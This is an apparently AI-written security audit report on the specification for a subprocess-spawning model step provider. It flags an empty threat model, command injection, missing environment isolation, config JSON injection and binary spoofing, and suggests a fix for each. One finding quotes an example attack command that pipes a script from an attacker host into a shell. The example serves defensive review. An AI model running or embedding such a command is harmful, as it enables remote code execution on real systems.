# Audit Report -- Security / Threat Model -- OpenCode Step Provider

**Date:** 2026-08-19
**Spec version:** v1.0
**Auditor:** Claude (subprocess, zero context)

## Scope

Files reviewed:

- `_index.md`
- `guiding-principles.md`
- `out-of-scope.md`
- `threat-model.md`
- `provider-abstraction.md`
- `step-model-integration.md`
- `packages/web-backend/docs/SECURITY.md` (context)

## Executive summary

The spec introduces a new attack surface (subprocess spawning with user-controlled prompts and MCP server definitions) but was approved with every STRIDE category empty, both named threats left open, no concrete env isolation mechanism, and no validation requirements on the most dangerous input fields (`McpServer.command`, `McpServer.cwd`, `OPENCODE_CONFIG_CONTENT`). Score: 2/10.

## Findings

### [CRITICAL] Entire STRIDE analysis is marked pending -- spec approved with empty threat model

- **Source:** `threat-model.md` § STRIDE analysis (all 6 categories)
- **Finding:** Every STRIDE category contains `*(pending...)*` placeholder text. The spec was approved as v1.0 with zero substantive threat analysis in any category.
- **Suggested fix:** Complete all 6 STRIDE categories. At minimum: Spoofing (provider binary identity), Tampering (prompt/output integrity), Repudiation (step execution audit log), DoS (hanging subprocess).

### [CRITICAL] T-01 and T-02 both listed as "Open" with no mitigations -- security goals unmet

- **Source:** `threat-model.md` § Mitigations table; `provider-abstraction.md` § Security considerations
- **Finding:** Both named threats are Open with Decision # blank. "Each ModelProvider is responsible for env isolation" is an assertion, not a mitigation.
- **Suggested fix:** Each threat row must have a concrete mechanism and status `Implemented` or `Deferred with acceptance` before approval.

### [CRITICAL] Prompt as positional arg to `opencode run` -- command injection unaddressed

- **Source:** `_index.md` § Decision #2; `provider-abstraction.md` § CLI flag mapping
- **Finding:** Prompt is a positional arg; if spawned via shell string (not explicit args array), shell metacharacters in user-controlled prompts become an injection vector. Spec has zero discussion of this.
- **Suggested fix:** Mandate `child_process.spawn` with explicit `args` array, never `exec`/`shell:true`. Document in `provider-abstraction.md`.

### [CRITICAL] `McpServer.command[]` carries arbitrary executable paths -- no validation specified

- **Source:** `provider-abstraction.md` § Shared types; `step-model-integration.md` § Flow YAML
- **Finding:** `command: string[]` is passed directly to spawn. An attacker controlling flow YAML can specify any system binary (e.g. `/bin/bash -c "curl attacker.com | sh"`). No allowlist or path restriction exists.
- **Suggested fix:** Restrict `command[0]` to an allowlist or absolute pre-approved paths. Add a new threat entry. Document in `provider-abstraction.md`.

### [HIGH] Env isolation is an assertion, not a specified mechanism

- **Source:** `provider-abstraction.md` § Security considerations; `step-model-integration.md` § Security considerations
- **Finding:** `LaunchOptions.env?: Record<string, string>` -- if the caller passes `process.env`, both providers inherit all parent credentials. Spec gives no guidance on what to pass.
- **Suggested fix:** Specify an explicit allowlist per provider (e.g. Claude receives only `ANTHROPIC_API_KEY`). Forbid passing `process.env` directly.

### [HIGH] `--auto` flag implications NOT documented

- **Source:** `_index.md` § Decision #6; `provider-abstraction.md` § CLI flag mapping
- **Finding:** Decision #6 says "same `skipPermissions` field" with no documentation of what `--auto` authorizes (all file writes, shell executions, tool calls) and no risk statement.
- **Suggested fix:** Document `--auto` scope in `provider-abstraction.md`; require visible warning when `skipPermissions: true`; link to T-02.

### [HIGH] `OPENCODE_CONFIG_CONTENT` JSON injection -- no McpServer field sanitization

- **Source:** `provider-abstraction.md` § MCP serialization per provider
- **Finding:** McpServer fields are serialized verbatim. A `name` containing `"` breaks JSON structure; env values with newlines split the env var on some shells.
- **Suggested fix:** Validate McpServer fields with Zod before serialization (`name: ^[a-zA-Z0-9_-]+$`, `cwd` absolute no traversal, env values no newlines).

### [HIGH] `kill()` failure leaves orphaned processes -- not addressed

- **Source:** `out-of-scope.md` § ProviderLifecycleManager; `step-model-integration.md` § ClaudeLifecycleManager
- **Finding:** If exception occurs before `kill()` in the propagation chain, or parent crashes, subprocess runs indefinitely. No try/finally, no global cleanup handler specified.
- **Suggested fix:** Require registration in a module-level cleanup set + `process.on('exit'/'SIGTERM'/'SIGINT')` handler. Document in `provider-abstraction.md`.

### [MEDIUM] Binary spoofing via PATH manipulation -- not addressed

- **Source:** `threat-model.md` § Spoofing
- **Finding:** Provider resolved by plain string from YAML mapped to a binary found via PATH. No path pinning or checksum verification. A PATH manipulation attack substitutes a malicious binary.
- **Suggested fix:** Require absolute path configured at startup; add Spoofing threat entry.

### [MEDIUM] `OPENCODE_CONFIG_CONTENT` size limits not specified

- **Source:** `provider-abstraction.md` § MCP serialization
- **Finding:** Linux ARG_MAX (~2 MB total env+argv) can be silently hit with many MCP servers. Failure is a cryptic OS error at spawn time.
- **Suggested fix:** If JSON > 64 KB, fall back to temp file + `OPENCODE_CONFIG` path. Document threshold.

### [INFO] Open security questions reference resolved index questions but mitigations table not updated

- **Source:** `threat-model.md` § Open security questions
- **Finding:** T-01 and T-02 still show `Open` / no Decision # despite corresponding index questions being resolved.
- **Suggested fix:** Update mitigations table when closing a linked open question.

## New open questions raised

1. Exact env allowlist per provider (T-01 mitigation)?
2. McpServer.command[0] allowlist or absolute-path restriction?
3. OPENCODE_CONFIG_CONTENT size fallback threshold (64 KB suggested)?
4. Audit log of provider/step/prompt for repudiation coverage?
5. Should skipPermissions: true on OpenCode step require explicit flow-author acknowledgement?

## Score: 2/10

Spec approved with empty STRIDE, open threats, no concrete env isolation, and no input validation on the two highest-risk fields.
